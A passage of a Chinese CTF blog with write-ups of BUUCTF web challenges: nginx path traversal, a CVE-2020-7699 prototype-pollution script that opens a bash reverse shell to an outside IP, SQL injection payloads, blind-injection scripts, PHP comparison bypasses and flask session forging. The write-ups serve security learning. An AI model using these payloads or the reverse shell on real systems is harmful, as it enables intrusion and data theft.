class=\"line\"> </span><br><span class=\"line\">http &#123;                                # http设置</span><br><span class=\"line\">    ....</span><br><span class=\"line\"> </span><br><span class=\"line\">    server &#123;                        # 服务器主机配置</span><br><span class=\"line\">        ....</span><br><span class=\"line\">        location &#123;                    # 路由配置</span><br><span class=\"line\">            ....</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        location path &#123;</span><br><span class=\"line\">            ....</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        location otherpath &#123;</span><br><span class=\"line\">            ....</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        ....</span><br><span class=\"line\"> </span><br><span class=\"line\">        location &#123;</span><br><span class=\"line\">            ....</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    upstream name &#123;                    # 负载均衡配置</span><br><span class=\"line\">        ....</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发现有目录穿越漏洞参考</p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p>\n<p>/static../</p>\n<p><img src=\"/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004162700298.png\" alt=\"image-20201004162700298\"></p>\n<p>之后就是找cve了，比较菜，只能学习</p>\n<p>cve-2020-7699</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">cmd = <span class=\"string\">'bash -c \"bash -i &amp;&gt; /dev/tcp/39.97.105.125/8080 0&gt;&amp;1\"'</span></span><br><span class=\"line\"><span class=\"comment\"># pollute</span></span><br><span class=\"line\">r1 = requests.post(<span class=\"string\">'http://219.219.61.234:20006/y0u_CaNn07_Gu3ss_tHe_pATh'</span>, files = &#123;<span class=\"string\">'__proto__.outputFunctionName'</span>: (</span><br><span class=\"line\">    <span class=\"literal\">None</span>, <span class=\"string\">\"x;process.mainModule.require('child_process').exec('&#123;&#125;');x\"</span>.format(cmd))&#125;)</span><br><span class=\"line\">print(r1.text)</span><br><span class=\"line\"><span class=\"comment\"># execute command</span></span><br><span class=\"line\">r2 = requests.get(<span class=\"string\">'http://219.219.61.234:20006/'</span>)</span><br><span class=\"line\">print(r2.text)</span><br></pre></td></tr></table></figure>\n<p>之后反弹shell，执行命令。</p>\n","categories":["CTF"],"tags":["WP"]},{"title":"BUU(Web)","url":"https://pz1o.top/2020/09/27/BUU刷题/","content":"<a id=\"more\"></a>\n<h1 id=\"BUU-Web\"><a href=\"#BUU-Web\" class=\"headerlink\" title=\"BUU(Web)\"></a>BUU(Web)</h1><h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>其实自己会做完题写一些wp，但奈何自己三天摸鱼两天休息，所以上传上来监督自己学习</p>\n<p>顺便分一下类</p>\n<h1 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h1><h2 id=\"强网杯-2019-随便注（堆叠注入）\"><a href=\"#强网杯-2019-随便注（堆叠注入）\" class=\"headerlink\" title=\"[强网杯 2019]随便注（堆叠注入）\"></a>[强网杯 2019]随便注（堆叠注入）</h2><blockquote>\n<p>堆叠注入：</p>\n<p>分号（；）来表示一条sql语句的结束。结束一个sql语句再继续构造下一条语句，可以一起执行。堆叠注入可以执行的是任意的语句。</p>\n</blockquote>\n<p>先来了解一下堆叠注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#39; #</span><br><span class=\"line\">1&#39; order by 2#</span><br><span class=\"line\">1&#39; union select 1,2#</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823154827319.png\" alt=\"image-20200823154827319\"></p>\n<p>可以看到过滤了大多数语句，但我们还有show，alert，rename，desc等</p>\n<p>通过看表可以看见两个表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#39;;desc words;#</span><br></pre></td></tr></table></figure>\n<p>words表</p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823155250757.png\" alt=\"image-20200823155250757\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#39;;desc &#96;1919810931114514&#96;;#  &#x2F;&#x2F;在mysql中数字型需要&#96;&#96;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823180812053.png\" alt=\"image-20200823180812053\"></p>\n<p>此时，我们就找见了flag，但问题是怎么拿出flag呢？</p>\n<p>下面操作是骚姿势：</p>\n<p>主要思想是利用回显位置来倒退获取flag，回显肯定是id到words表里面找数据，然后回显，那么我们在查询语句不变的前提下，将flag回显出来？</p>\n<ul>\n<li>把words表改名，把数字表改为words；</li>\n<li>往新words表里面插入一个id参数，这样回显就可以找到id，从而显示出flag</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select id,data from words where id&#x3D;&#39;id&#39;;</span><br></pre></td></tr></table></figure>\n<p>所以flag还得改成data</p>\n<p>最终payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#39;;rename table words to word1;rename table &#96;1919810931114514&#96; to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823191000126.png\" alt=\"image-20200823191000126\"></p>\n<p><strong>复习一下mysql操作</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#表重命名</span><br><span class=\"line\">rename table o_name to n_name;</span><br><span class=\"line\">#新增字段</span><br><span class=\"line\">alert table table_name add column_name [type];</span><br><span class=\"line\">#修改字段名</span><br><span class=\"line\">alert table table_name change o_name n_name [type];</span><br></pre></td></tr></table></figure>\n<h2 id=\"SUCTF-2019-EasySQL（堆叠注入）\"><a href=\"#SUCTF-2019-EasySQL（堆叠注入）\" class=\"headerlink\" title=\"[SUCTF 2019]EasySQL（堆叠注入）\"></a>[SUCTF 2019]EasySQL（堆叠注入）</h2><p>过滤了很多东西，但依然可以堆叠注入</p>\n<p>找到Flag表</p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823214702265.png\" alt=\"image-20200823214702265\"></p>\n<p>之后就不会做了…</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 1;set sql_mode&#x3D;pipes_as_concat;</span><br><span class=\"line\">select 1||flag from Flag;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>补充系统变量@@sql_mode：是一组mysql支持的基本语法及校验规则<br>PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，也和字符串的拼接函数Concat相类似</p>\n</blockquote>\n<p>原本||是or的意思，这里拼接之后：</p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823215540471.png\" alt=\"image-20200823215540471\"></p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823215640962.png\" alt=\"image-20200823215640962\"></p>\n<h2 id=\"极客大挑战-2019-EasySQL\"><a href=\"#极客大挑战-2019-EasySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]EasySQL\"></a>[极客大挑战 2019]EasySQL</h2><p>直接万能密码登录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&#39; or 1&#x3D;1 %23&amp;password&#x3D;1&#39; or 1&#x3D;1%23</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823221210961.png\" alt=\"image-20200823221210961\"></p>\n<h2 id=\"极客大挑战-2019-LoveSQL\"><a href=\"#极客大挑战-2019-LoveSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]LoveSQL\"></a>[极客大挑战 2019]LoveSQL</h2><p>简单的sql注入</p>\n<p>直接union注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#</span><br><span class=\"line\">1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;geekuser&quot;),(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;l0ve1ysq1&quot;)#</span><br><span class=\"line\">1&#39; union select 1,(select group_concat(password) from geekuser),(select group_concat(password) from l0ve1ysq1)#</span><br></pre></td></tr></table></figure>\n<h2 id=\"极客大挑战-2019-BabySQL（过滤关键字）\"><a href=\"#极客大挑战-2019-BabySQL（过滤关键字）\" class=\"headerlink\" title=\"[极客大挑战 2019]BabySQL（过滤关键字）\"></a>[极客大挑战 2019]BabySQL（过滤关键字）</h2><p>双写绕过</p>\n<p>查关键字可以先select语句观察哪些被过滤了。</p>\n<p>其中关键字有select，union，or（包括information,password），from，where，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#39; ununionion selselectect  1,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database()),3 #</span><br><span class=\"line\">&#x2F;&#x2F;b4bsql,geekuser</span><br><span class=\"line\">1&#39; ununionion selselectect  1,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;),(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;geekuser&#39;) #</span><br><span class=\"line\">&#x2F;&#x2F;id username password</span><br><span class=\"line\">&#x2F;&#x2F;id username password</span><br><span class=\"line\">1&#39; ununionion selselectect  1,(selselectect group_concat(username,passwoorrd) frfromom b4bsql),(selselectect group_concat(username,passwoorrd) frfromom geekuser) #</span><br><span class=\"line\">flag&#123;1745650a-3c83-4068-a316-f2604dc9e366&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"CISCN2019-华北赛区-Day2-Web1-Hack-World（过滤关键字和空格的盲注）\"><a href=\"#CISCN2019-华北赛区-Day2-Web1-Hack-World（过滤关键字和空格的盲注）\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day2 Web1]Hack World（过滤关键字和空格的盲注）\"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World（过滤关键字和空格的盲注）</h2><p>简单测试了一下</p>\n<p>发现空格被过滤了，union、and、or也被过滤了，并且发现列有两列，报错只出bool，于是就想到是不是盲注，但首要问题是怎么绕过空格</p>\n<p>以下有几种绕空格的办法</p>\n<blockquote>\n<p>/**/ （） %0a `` tab</p>\n</blockquote>\n<p>这里我们用（）来绕过，接下来就是写脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">dic =<span class=\"string\">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class=\"line\">url = <span class=\"string\">\"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php\"</span></span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        payload = <span class=\"string\">\"if((mid((select(flag)from(flag)),&#123;0&#125;,1)='&#123;1&#125;'),1,2)\"</span>.format(i,j)</span><br><span class=\"line\">        data = &#123;<span class=\"string\">\"id\"</span>: payload,&#125;</span><br><span class=\"line\">        r = requests.post(url=url,data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"Hello\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            print(payload)</span><br><span class=\"line\">            flag += j</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    print(flag)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">拿到flag</span><br><span class=\"line\">flag&#123;3ba1b350-3474-44d2-a3cd-52f61aaeca64&#125;</span><br></pre></td></tr></table></figure>\n<p>但我自己写的脚本很诡异，无法检测到-，只能通过payload倒推</p>\n<p>所以又换了一个写了一下,用ascii字符来判断</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">dic =<span class=\"string\">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class=\"line\">url = <span class=\"string\">\"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php\"</span></span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">        payload = <span class=\"string\">\"if(ascii(mid((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)\"</span>.format(i,j);</span><br><span class=\"line\">        data = &#123;<span class=\"string\">\"id\"</span>: payload,&#125;</span><br><span class=\"line\">        r = requests.post(url=url,data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"Hello\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            print(payload)</span><br><span class=\"line\">            flag += str(chr(j))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    print(flag)</span><br></pre></td></tr></table></figure>\n<p>刚写脚本，对其中原理还不是很熟悉，希望后续能深入学习py</p>\n<h1 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h1><h2 id=\"极客大挑战-2019-Havefun\"><a href=\"#极客大挑战-2019-Havefun\" class=\"headerlink\" title=\"[极客大挑战 2019]Havefun\"></a>[极客大挑战 2019]Havefun</h2><p>直接看源码</p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823222031931.png\" alt=\"image-20200823222031931\"></p>\n<p>拿flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat&#x3D;dog</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823222049635.png\" alt=\"image-20200823222049635\"></p>\n<h2 id=\"极客大挑战-2019-BuyFlag\"><a href=\"#极客大挑战-2019-BuyFlag\" class=\"headerlink\" title=\"[极客大挑战 2019]BuyFlag\"></a>[极客大挑战 2019]BuyFlag</h2><p>主要说一下两个函数</p>\n<p><strong>strcmp()</strong></p>\n<blockquote>\n<p>strcmp()函数只有在相等的情况下返回0。<br>那么我们传入一个数组，它会返回NULL，而判断使用了== ，而NULL==0是bool(true)，这样就成功绕过。</p>\n</blockquote>\n<p><strong>is_numeric()</strong></p>\n<blockquote>\n<p>is_numeric() 判断变量是否为数字或数字字符串，不仅检查10进制，16进制也可以。<br>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对于第一个空格字符会跳过空格字符判断，接着后面的判断！<br>该函数还可能造成sql注入，例如将‘1 or 1’转换为16进制形式，再传参，就可以造成sql注入</p>\n</blockquote>\n<p>之后就是改cookie，post进password和money</p>\n<p>这里判断money相等用的是strcmp()所以我们可以用数组绕过</p>\n<h2 id=\"BJDCTF2020-Easy-MD5（ffifdyop）\"><a href=\"#BJDCTF2020-Easy-MD5（ffifdyop）\" class=\"headerlink\" title=\"[BJDCTF2020]Easy MD5（ffifdyop）\"></a>[BJDCTF2020]Easy MD5（<strong>ffifdyop</strong>）</h2><p>发了几个数字后没发现什么东西，然后抓包，看见hint</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br></pre></td></tr></table></figure>\n<p>这里想要绕过的话肯定是找万能密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">password&#x3D;&#39;&#39; or &#39;123&#39;</span><br></pre></td></tr></table></figure>\n<p>这里的话用的是<strong>ffifdyop</strong>MD5加密后为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;or&#39;6É]™é!r,ùíb\u001c</span><br></pre></td></tr></table></figure>\n<p>符合万能密码</p>\n<p>进入下一关</p>\n<p>源码如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a &#x3D; $GET[&#39;a&#39;];</span><br><span class=\"line\">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class=\"line\"></span><br><span class=\"line\">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br></pre></td></tr></table></figure>\n<p>这个可以拿数组过，也可以找一些特殊的如</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">QNKCDZO</span><br><span class=\"line\">240610708</span><br><span class=\"line\">s878926199a</span><br><span class=\"line\">s155964671a</span><br><span class=\"line\">s214587387a</span><br><span class=\"line\">s214587387a</span><br></pre></td></tr></table></figure>\n<p>他们的MD5都是0</p>\n<p>最后一关源码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>直接拿数组绕过就好</p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200903205415553.png\" alt=\"image-20200903205415553\"></p>\n<h3 id><a href=\"#\" class=\"headerlink\" title=\" \"></a> </h3><h1 id=\"开发\"><a href=\"#开发\" class=\"headerlink\" title=\"开发\"></a>开发</h1><h2 id=\"护网杯-2018-easy-tornado\"><a href=\"#护网杯-2018-easy-tornado\" class=\"headerlink\" title=\"[护网杯 2018]easy_tornado\"></a>[护网杯 2018]easy_tornado</h2><p>学习一下tornado</p>\n<p><a href=\"https://blog.csdn.net/belalds/article/details/80575755\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/belalds/article/details/80575755</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> tornado.web</span><br><span class=\"line\"><span class=\"keyword\">import</span> tornado.ioloop</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexHandler</span><span class=\"params\">(tornado.web.RequestHandler)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"主路由处理类\"\"\"</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"对应http的get请求方式\"\"\"</span></span><br><span class=\"line\">        self.write(<span class=\"string\">\"Hello Itcast!\"</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    app = tornado.web.Application([</span><br><span class=\"line\">        (<span class=\"string\">r\"/\"</span>, IndexHandler),</span><br><span class=\"line\">    ])</span><br><span class=\"line\">    app.listen(<span class=\"number\">8000</span>)</span><br><span class=\"line\">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>\n<ol>\n<li>tornado.web</li>\n</ol>\n<p>tornado的基础web框架模块</p>\n<ul>\n<li><strong>RequestHandler</strong></li>\n</ul>\n<p>封装了对应一个请求的所有信息和方法，write(响应信息)就是写响应信息的一个方法；对应每一种http请求方式（get、post等），把对应的处理逻辑写进同名的成员方法中（如对应get请求方式，就将对应的处理逻辑写在get()方法中），当没有对应请求方式的成员方法时，会返回“<strong>405: Method Not Allowed</strong>”错误。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> tornado.web</span><br><span class=\"line\"><span class=\"keyword\">import</span> tornado.ioloop</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexHandler</span><span class=\"params\">(tornado.web.RequestHandler)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"主路由处理类\"\"\"</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span><span class=\"params\">(self)</span>:</span>  <span class=\"comment\"># 我们修改了这里</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"对应http的post请求方式\"\"\"</span></span><br><span class=\"line\">        self.write(<span class=\"string\">\"Hello Itcast!\"</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    app = tornado.web.Application([</span><br><span class=\"line\">        (<span class=\"string\">r\"/\"</span>, IndexHandler),</span><br><span class=\"line\">    ])</span><br><span class=\"line\">    app.listen(<span class=\"number\">8000</span>)</span><br><span class=\"line\">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>Application</strong></li>\n</ul>\n<p>Tornado Web框架的核心应用类，是与服务器对接的接口，里面保存了路由信息表，其初始化接收的第一个参数就是一个路由信息映射元组的列表；其listen(端口)方法用来创建一个http服务器实例，并绑定到给定端口（<strong>注意：此时服务器并未开启监听</strong>）。</p>\n<p><strong>总结Tornado Web程序编写思路</strong></p>\n<ol>\n<li>创建web应用实例对象，第一个初始化参数为路由映射列表。</li>\n<li>定义实现路由映射列表中的handler类。</li>\n<li>创建服务器实例，绑定服务器端口。</li>\n<li>启动当前线程的IOLoop。</li>\n</ol>\n<h2 id=\"HCTF-2018-admin（flask中session伪造）\"><a href=\"#HCTF-2018-admin（flask中session伪造）\" class=\"headerlink\" title=\"[HCTF 2018]admin（flask中session伪造）\"></a>[HCTF 2018]admin（flask中session伪造）</h2><p>发现只能admin才能登录获取flag</p>\n<p>主要学习一下flask中的session伪造</p>\n<p><strong>session一般存储在服务器，而在flask中，session是存储在客户端，并且flask中对数据仅仅进行了签名，签名主要目的是防止篡改，但却无法防止被读取。所以就会产生一些安全问题。</strong></p>\n<p>在这个题中，我们就可以根据这个来解题</p>\n<p>先来看一下自己注册用户test的cookie，之后进行解码，可以参考p牛的脚本，也可以上github上找flask-session-manager之后done下来</p>\n<p>我这里用的是python2.7</p>\n<p>解密:<code>python flask_session_manager2.py decode -c -s # -c是flask cookie里的session值 -s参数是SECRET_KEY</code><br> 加密:<code>python flask_session_manager2.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.eJw9kEGPgjAQhf_KZs4eBJcLiZdNkUjSIZBKM70Y10VKS90EMCjG_77VTbxN8mbe-97cYX_q60FDPPaXegH79gfiO3x8Qwzc8WUuN45kaXLRGWSVphC1Mk2Uy6ojWYRosg7DTYuzNmi0Ib_HjXY8pJWS6Ge6cZlc8zQJlKlabjLHWWn5vHFcFCtMdzeabcRd5hTbTWjsFV0RkdtFitlJCZ_FmiuZUpOgT5KVU6IIFPM8YRKQ0JYLWsNjAcehP-3HX1uf3xWQFQGm2-l5ygW2Sm5DlVYdTynC2WN4TBJf3RORRGbRHG-qWb_sWndo6rdTmWSzmP6V88F5AcZ6GGEBl6HuX2-DYAmPP9bObbw.X1R2Pw.c_FhTL4z1ufpRuGX5k2__AoFhBU</span><br><span 